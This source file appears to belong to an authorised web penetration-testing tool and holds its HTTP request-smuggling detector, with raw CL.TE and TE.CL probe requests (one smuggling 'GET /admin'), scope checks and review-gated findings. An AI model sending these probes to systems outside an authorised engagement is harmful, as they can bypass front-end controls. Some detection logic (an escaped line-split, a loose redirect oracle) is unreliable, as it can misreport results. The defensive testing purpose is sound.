# src/webpent/agents/request_smuggling/agent.py
"""webpent.agents.request_smuggling.agent

V7 Sprint 2.3 — HTTP Request Smuggling Detection.

Detects HTTP request smuggling (CL.TE, TE.CL, TE.TE) by sending
deliberately malformed requests with conflicting Content-Length and
Transfer-Encoding headers, then observing differential responses.

Per V7 Architectural Plan §2.3: this introduces genuinely new attack
surface for WebPent's own network layer. The detection uses
``httpx`` with raw HTTP (not the SSRF-pinning transport, since
smuggling requires sending non-standard header combinations that the
pinning transport would rewrite). All requests are still gated by
the engagement-scope allowlist and the SSRF blocklist — the smuggling probe
only sends to the target URL (which has already been validated by
the scope_enforcer).

Safety controls:
  * Per V7 P0: the engagement-scope allowlist
    (``webpent.shared.engagement_scope``) restricts SSRF-guard
    exemptions to the operator-declared target host only. The
    removed Dev Mode / ``mock_target_hosts`` framework no longer
    exists.
  * Per Principle 2 (fail-closed): if the probe encounters an error,
    it logs and returns — it does NOT attempt to exploit the
    smuggling vector.
  * The probe sends only TWO requests per vector (one probe, one
    detection request) to minimize network impact.
"""

from __future__ import annotations

import contextlib
import logging
import socket
import ssl
import time
from typing import Any
from urllib.parse import urlparse

from langchain_core.messages import AIMessage

from webpent.models.findings import Confidence, Finding, Severity, VulnClass
from webpent.state.state import PentestState

logger = logging.getLogger(__name__)

_RAW_MAX_REQUEST_BYTES = 16 * 1024
_RAW_MAX_RESPONSE_BYTES = 8 * 1024
_RAW_CONNECT_TIMEOUT_SECONDS = 5.0
_RAW_IDLE_TIMEOUT_SECONDS = 2.0


def _send_raw_http(
    host: str,
    port: int,
    raw_request: bytes,
    use_tls: bool,
    timeout: float = 10.0,
) -> bytes | None:
    """Send a raw HTTP request over a TCP/TLS socket and return the response.

    This is necessary for request-smuggling detection because httpx
    normalizes headers and won't send conflicting Content-Length +
    Transfer-Encoding. We need raw socket control to craft the
    malformed request exactly.

    The socket is created with a timeout and closed in a ``finally``
    block. Returns ``None`` on any error.
    """
    sock: socket.socket | None = None
    if timeout <= 0 or len(raw_request) > _RAW_MAX_REQUEST_BYTES:
        logger.warning("Raw HTTP refused: invalid timeout or request budget")
        return None
    deadline = time.monotonic() + timeout
    try:
        # Defense in depth: enforce the engagement boundary inside the raw
        # sender as well as at node entry. This keeps future callers from
        # accidentally turning this low-level primitive into an SSRF path.
        from webpent.shared.engagement_scope import is_engagement_target_host
        from webpent.shared.http import _resolve_first_ip

        if not is_engagement_target_host(host):
            logger.warning("Raw HTTP refused for host outside engagement scope: %s", host)
            return None
        pinned_ip = _resolve_first_ip(host, port, allow_blocked=True)
        if not pinned_ip:
            logger.warning("Raw HTTP DNS resolution failed for scoped host: %s", host)
            return None

        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return None
        sock = socket.create_connection(
            (pinned_ip, port), timeout=min(remaining, _RAW_CONNECT_TIMEOUT_SECONDS)
        )
        if use_tls:
            # Production-safe TLS: validate the certificate chain and the
            # target hostname. Self-signed/mismatched lab certificates fail
            # closed instead of silently disabling authentication.
            ctx = ssl.create_default_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return None
        sock.settimeout(min(remaining, _RAW_IDLE_TIMEOUT_SECONDS))
        sock.sendall(raw_request)
        # Read the response under both total-deadline and byte/idle budgets.
        response = b""
        while len(response) < _RAW_MAX_RESPONSE_BYTES:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, _RAW_IDLE_TIMEOUT_SECONDS))
            chunk = sock.recv(min(4096, _RAW_MAX_RESPONSE_BYTES - len(response)))
            if not chunk:
                break
            response += chunk
        return response
    except Exception as exc:
        logger.debug("Raw HTTP send failed: %s", exc)
        return None
    finally:
        if sock:
            with contextlib.suppress(Exception):
                sock.close()


def _probe_cl_te_outcome(
    host: str, port: int, use_tls: bool, cookies: dict[str, str] | None = None
) -> str:
    """Probe for CL.TE smuggling vector.

    Sends a request with BOTH Content-Length and Transfer-Encoding
    headers. If the front-end uses Content-Length and the back-end
    uses Transfer-Encoding (CL.TE), the back-end will see an
    additional "smuggled" request. We detect this by sending a probe
    that poisons the connection, then sending a normal request — if
    the response to the second request is unexpected, smuggling is
    confirmed.

    Returns ``confirmed``, ``parser_rejected``, or ``inconclusive``. The
    legacy bool wrapper below promotes only ``confirmed``.

    V9 P0 B4: ``cookies`` parameter attaches a Cookie header to the
    raw HTTP request so authenticated smuggling targets are reachable.
    """
    # V9 P0 B4: build Cookie header from session cookies.
    cookie_header = ""
    if cookies:
        from webpent.shared.http import build_cookie_header

        cookie_header = "Cookie: " + build_cookie_header(cookies) + "\r\n"

    # CL.TE probe: Content-Length says 6 bytes, Transfer-Encoding says chunked.
    # The front-end (CL) sees the full body and forwards it.
    # The back-end (TE) reads the chunked body, then treats the
    # remaining "SMUGGLED" as a new request.
    probe_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{cookie_header}"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"SMUGGLED\r\n"
    ).encode()

    # Detection request — a normal GET.
    detection_request = (f"GET / HTTP/1.1\r\nHost: {host}\r\n{cookie_header}\r\n").encode()

    def _status_codes(response: bytes | None) -> list[int]:
        if not response:
            return []
        lines = response.split(b"\r\n")
        codes: list[int] = []
        for line in lines:
            if not line.startswith(b"HTTP/"):
                continue
            try:
                codes.append(int(line.split()[1]))
            except (IndexError, ValueError):
                continue
        return codes

    # Establish a control response from a normal request. A lone 400 is not
    # evidence: malformed probes commonly produce a normal parser rejection.
    baseline = _send_raw_http(host, port, detection_request, use_tls)
    baseline_codes = _status_codes(baseline)
    if not baseline_codes:
        return "inconclusive"

    # The probe and the detection request must share one TCP connection. The
    # previous implementation opened a fresh connection for the detection
    # request, so connection poisoning could never be observed and a fixed
    # 400 response became a false positive.
    combined_response = _send_raw_http(
        host,
        port,
        probe_request + detection_request,
        use_tls,
    )
    codes = _status_codes(combined_response)
    if len(codes) < 2:
        return "parser_rejected" if any(400 <= code < 500 for code in codes) else "inconclusive"

    first, second = codes[0], codes[1]
    # Conservative oracle: the control must be non-error, the combined
    # exchange must expose two responses, and the second response must be a
    # parser/error response that differs from the control. This still yields
    # a signal for a desync while rejecting the common "every malformed
    # request gets 400" negative case.
    confirmed = (
        200 <= baseline_codes[0] < 400
        and 200 <= first < 500
        and 400 <= second < 500
        and second != baseline_codes[0]
    )
    if confirmed:
        return "confirmed"
    if any(400 <= code < 500 for code in codes):
        return "parser_rejected"
    return "inconclusive"


def _probe_cl_te(
    host: str, port: int, use_tls: bool, cookies: dict[str, str] | None = None
) -> bool:
    """Backward-compatible boolean CL.TE probe."""
    return _probe_cl_te_outcome(host, port, use_tls, cookies=cookies) == "confirmed"


def _probe_te_cl_outcome(
    host: str, port: int, use_tls: bool, cookies: dict[str, str] | None = None
) -> str:
    """Probe for TE.CL smuggling vector.

    Sends a request where Transfer-Encoding: chunked is used by the
    front-end, but the back-end uses Content-Length. The chunked body
    is crafted so the Content-Length hides a smuggled request.

    Returns ``confirmed``, ``parser_rejected``, or ``inconclusive``.

    V9 P0 B4: ``cookies`` parameter attaches a Cookie header to the
    raw HTTP request so authenticated smuggling targets are reachable.
    """
    # V9 P0 B4: build Cookie header from session cookies.
    cookie_header = ""
    if cookies:
        from webpent.shared.http import build_cookie_header

        cookie_header = "Cookie: " + build_cookie_header(cookies) + "\r\n"

    # TE.CL probe: Transfer-Encoding: chunked with a body that,
    # when interpreted by Content-Length, hides the smuggled request.
    probe_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{cookie_header}"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"5e\r\n"
        f"GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: text/plain\r\n"
        f"Content-Length: 10\r\n"
        f"\r\n"
        f"smuggled=1\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()

    # Send the probe twice — if the back-end processes the smuggled
    # request, the second probe may get a different response.
    resp1 = _send_raw_http(host, port, probe_request, use_tls)
    resp2 = _send_raw_http(host, port, probe_request, use_tls)

    if resp1 is None or resp2 is None:
        return "inconclusive"

    # If the responses differ significantly, the connection was poisoned.
    # A more reliable signal: the response contains "admin" or a redirect.
    for resp in (resp1, resp2):
        text = resp.decode("utf-8", errors="replace")
        if (
            "/admin" in text.lower()
            or "301" in text.split("\r\n")[0]
            or "302" in text.split("\r\n")[0]
        ):
            return "confirmed"
    status_lines = (resp1 + resp2).split(b"\\r\\n")
    if any(
        line.startswith(b"HTTP/")
        and len(line.split()) > 1
        and line.split()[1].isdigit()
        and 400 <= int(line.split()[1]) < 500
        for line in status_lines
    ):
        return "parser_rejected"
    return "inconclusive"


def _probe_te_cl(
    host: str, port: int, use_tls: bool, cookies: dict[str, str] | None = None
) -> bool:
    """Backward-compatible boolean TE.CL probe."""
    return _probe_te_cl_outcome(host, port, use_tls, cookies=cookies) == "confirmed"


# NOTE: deterministic agent — no LLM reasoning by design (verified 2026-08-21).
def request_smuggling_node(state: PentestState) -> dict:
    """LangGraph node: detect HTTP request smuggling (CL.TE, TE.CL).

    V7 Sprint 2.3: Sends raw HTTP requests with conflicting
    Content-Length and Transfer-Encoding headers to detect request
    smuggling desync between front-end and back-end servers.

    Uses raw sockets (not httpx) because httpx normalizes headers and
    won't send the conflicting header combination that smuggling
    requires. The target host is validated against the engagement-scope
    allowlist (``webpent.shared.engagement_scope``) before any
    connection is made — the raw-socket path cannot use the httpx SSRF
    guard, so an explicit scope check is the fail-closed gate.

    V9 P0 B4/B6: session cookies are now propagated to the raw-socket
    probes so authenticated smuggling targets (e.g. DVWA behind login)
    are reachable. Stale Dev Mode documentation removed.
    """
    target = state.get("target")
    findings: list[Finding] = list(state.get("findings") or [])
    # V9 P0 B4: read session cookies so authenticated smuggling targets
    # are reachable via the raw-socket path.
    session_cookies: dict[str, str] | None = state.get("session_cookies") or None

    base_url = getattr(target, "url", "")
    if not base_url:
        return {
            "messages": [
                AIMessage(content="Request Smuggling Detector: no target URL — skipping.")
            ],
            "current_phase": "request_smuggling_detection",
        }

    logger.info("Request Smuggling Detector (V7 Sprint 2.3) entered for target=%s", base_url)

    parsed = urlparse(base_url)
    host = parsed.hostname
    if not host:
        return {
            "messages": [
                AIMessage(content="Request Smuggling Detector: no host in URL — skipping.")
            ],
            "current_phase": "request_smuggling_detection",
        }

    # V9 P0 B6: explicit engagement-scope / SSRF check on the raw-socket
    # path. The raw-socket probes bypass httpx's SSRF guard (they must,
    # to send malformed headers), so we manually verify the target host
    # is the operator-declared engagement target. This is the fail-closed
    # gate that prevents the raw-socket path from being abused as an
    # SSRF vector to scan arbitrary internal hosts.
    try:
        from webpent.shared.engagement_scope import is_engagement_target_host

        if not is_engagement_target_host(host):
            logger.warning(
                "Request Smuggling: host %s is NOT in the engagement-scope "
                "allowlist — skipping raw-socket probes (fail-closed). The "
                "raw-socket path cannot use the httpx SSRF guard, so this "
                "explicit check is the only gate preventing SSRF.",
                host,
            )
            return {
                "messages": [
                    AIMessage(
                        content=(
                            f"Request Smuggling: host {host} not in engagement "
                            f"scope — skipped (fail-closed SSRF gate)."
                        )
                    )
                ],
                "current_phase": "request_smuggling_detection",
            }
    except ImportError:
        logger.warning(
            "Request Smuggling: engagement_scope module not importable — "
            "skipping raw-socket probes (fail-closed)."
        )
        return {
            "messages": [
                AIMessage(content="Request Smuggling: scope check unavailable — skipped.")
            ],
            "current_phase": "request_smuggling_detection",
        }

    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)

    new_findings: list[Finding] = []
    probe_coverage: list[dict[str, str]] = []

    # Probe CL.TE
    try:
        cl_te_outcome = _probe_cl_te_outcome(host, port, use_tls, cookies=session_cookies)
        probe_coverage.append({"probe": "CL.TE", "status": cl_te_outcome})
        if cl_te_outcome == "confirmed":
            # V10 RESIDUAL FIX: wrap Finding construction in a narrow
            # try/except so a pydantic ValidationError (or any other
            # construction bug) is logged at ERROR and the loop
            # continues to the TE.CL probe, instead of being swallowed
            # at debug level by the outer try/except which would lose
            # the finding entirely. Mirrors access_control pattern.
            try:
                finding = Finding(
                    title=f"HTTP Request Smuggling (CL.TE) at {host}",
                    description=(
                        f"The target at {host}:{port} is vulnerable to HTTP "
                        f"Request Smuggling via the CL.TE vector. The front-end "
                        f"server uses Content-Length while the back-end uses "
                        f"Transfer-Encoding: chunked, allowing an attacker to "
                        f"smuggle requests that bypass front-end security "
                        f"controls, poison the connection pool, or steal "
                        f"other users' responses."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.TENTATIVE,
                    confidence_level="Needs Human Review",
                    # V10 P0-1: VulnClass.REQUEST_SMUGGLING is now a real enum
                    # member; previously this raw string raised pydantic
                    # ValidationError and was swallowed by the surrounding
                    # try/except, losing the CL.TE finding.
                    vuln_class=VulnClass.REQUEST_SMUGGLING.value,
                    url=base_url,
                    tool_name="request_smuggling_detector",
                    payload="Content-Length: 6 + Transfer-Encoding: chunked",
                    evidence={
                        "causal_signal": True,
                        "negative_control_complete": False,
                        "proof_bundle": None,
                        "promotion_guard": "blocked_missing_negative_control_and_proof_bundle",
                        "probe_vector": "CL.TE",
                    },
                    reasoning=(
                        "Sent a POST with conflicting Content-Length and "
                        "Transfer-Encoding headers. The subsequent GET request "
                        "received a 400 Bad Request response, indicating the "
                        "connection was poisoned by a smuggled request — "
                        "confirming CL.TE desync between front-end and back-end."
                    ),
                )
            except Exception as exc:
                logger.error(
                    "request_smuggling: failed to construct CL.TE finding for %s: %s",
                    host,
                    exc,
                )
                finding = None
            if finding is not None:
                new_findings.append(finding)
                logger.warning("CL.TE request smuggling detected at %s", host)
    except Exception as exc:
        # V10 RESIDUAL FIX: probe-level failures stay at debug (network
        # errors are expected on targets that close the connection);
        # Finding-construction failures are caught above at ERROR.
        probe_coverage.append({"probe": "CL.TE", "status": "blocked"})
        logger.debug("CL.TE probe error for %s: %s", host, exc)

    # Probe TE.CL
    try:
        te_cl_outcome = _probe_te_cl_outcome(host, port, use_tls, cookies=session_cookies)
        probe_coverage.append({"probe": "TE.CL", "status": te_cl_outcome})
        if te_cl_outcome == "confirmed":
            # V10 RESIDUAL FIX: same narrow try/except + ERROR as CL.TE.
            try:
                finding = Finding(
                    title=f"HTTP Request Smuggling (TE.CL) at {host}",
                    description=(
                        f"The target at {host}:{port} is vulnerable to HTTP "
                        f"Request Smuggling via the TE.CL vector. The front-end "
                        f"server uses Transfer-Encoding: chunked while the "
                        f"back-end uses Content-Length, allowing an attacker "
                        f"to smuggle requests."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.TENTATIVE,
                    confidence_level="Needs Human Review",
                    # V10 P0-1: VulnClass.REQUEST_SMUGGLING — see CL.TE block
                    # above for the same fix on this second call site.
                    vuln_class=VulnClass.REQUEST_SMUGGLING.value,
                    url=base_url,
                    tool_name="request_smuggling_detector",
                    payload="Transfer-Encoding: chunked + Content-Length: 4",
                    evidence={
                        "causal_signal": True,
                        "negative_control_complete": False,
                        "proof_bundle": None,
                        "promotion_guard": "blocked_missing_negative_control_and_proof_bundle",
                        "probe_vector": "TE.CL",
                    },
                    reasoning=(
                        "Sent a POST with Transfer-Encoding: chunked and a "
                        "craft Content-Length that hides a smuggled GET /admin "
                        "request. The response contained evidence of the "
                        "smuggled request being processed."
                    ),
                )
            except Exception as exc:
                logger.error(
                    "request_smuggling: failed to construct TE.CL finding for %s: %s",
                    host,
                    exc,
                )
                finding = None
            if finding is not None:
                new_findings.append(finding)
                logger.warning("TE.CL request smuggling detected at %s", host)
    except Exception as exc:
        probe_coverage.append({"probe": "TE.CL", "status": "blocked"})
        logger.debug("TE.CL probe error for %s: %s", host, exc)

    logger.info("Request Smuggling Detector: %d findings generated", len(new_findings))

    # V7 Cognitive Upgrade — Phase 2: extract Mental Model updates for
    # the host this node probed. Pure additive — does not change any
    # existing smuggling-detection logic. Deterministic
    # regex/heuristic, NO LLM.
    mental_model_update: dict[str, Any] = {"nodes": {}, "edges": []}
    try:
        from webpent.models.mental_model import extract_mental_model_updates

        mental_model_update = extract_mental_model_updates(
            discovery_source="request_smuggling_node",
            hosts=[host] if host else None,
            target_url=getattr(target, "url", None),
        )
    except Exception as exc:
        logger.debug("Mental Model extraction (request_smuggling) failed: %s", exc)

    return {
        # merge_findings reducer dedup by id — safe
        "findings": findings + new_findings,
        "coverage_ledger": {
            "request_smuggling": {
                "status": "tested",
                "probes": probe_coverage,
                "finding_count": len(new_findings),
            }
        },
        "mental_model": mental_model_update,
        "messages": [
            AIMessage(
                content=f"Request Smuggling Detector: probed CL.TE and "
                f"TE.CL vectors against {host}. Found {len(new_findings)} "
                f"smuggling vulnerabilities."
            )
        ],
        "current_phase": "request_smuggling_detection",
    }
